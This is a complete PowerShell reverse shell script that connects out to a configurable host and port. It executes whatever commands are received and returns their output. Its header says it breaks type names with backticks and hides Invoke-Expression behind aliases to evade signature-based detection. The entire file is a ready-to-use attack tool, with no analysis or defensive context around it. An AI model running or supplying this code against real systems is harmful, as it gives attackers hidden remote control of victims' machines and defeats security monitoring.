# Alias-Obfuscated Shell
# Uses PowerShell aliases and backtick character-breaking to evade signature matching
# Default: 192.168.0.100:4444 — override with arguments

$h = if ($args[0]) { $args[0] } else { "192.168.0.100" }
$p = if ($args[1]) { [int]$args[1] } else { 4444 }

Set-Alias -Name Render -Value Out-String
Set-Alias -Name Dispatch -Value Invoke-Expression

$link = New-Object "Sy`st`em.Net.So`cke`ts.TC`PCl`ient"($h, $p)
$wire = $link.GetStream()
[byte[]]$frame = 0..(32768*2-1)|%{0}

$tag = ([text.encoding]::UTF8).GetBytes("PS $env:COMPUTERNAME [$h`:$p]> ")
$wire.Write($tag, 0, $tag.Length)

[byte[]]$recv = 0..(65535)|%{0}
while (($sz = $wire.Read($recv, 0, $recv.Length)) -ne 0) {
    $payload = [text.encoding]::UTF8.GetString($recv, 0, $sz)
    $exec = try { Dispatch $payload 2>&1 | Render } catch { $_.ToString() }
    $resp = $exec + "PS " + (Get-Location).Path + "> "
    $bytes = [text.encoding]::UTF8.GetBytes($resp)
    $wire.Write($bytes, 0, $bytes.Length)
    $wire.Flush()
}
$link.Close()
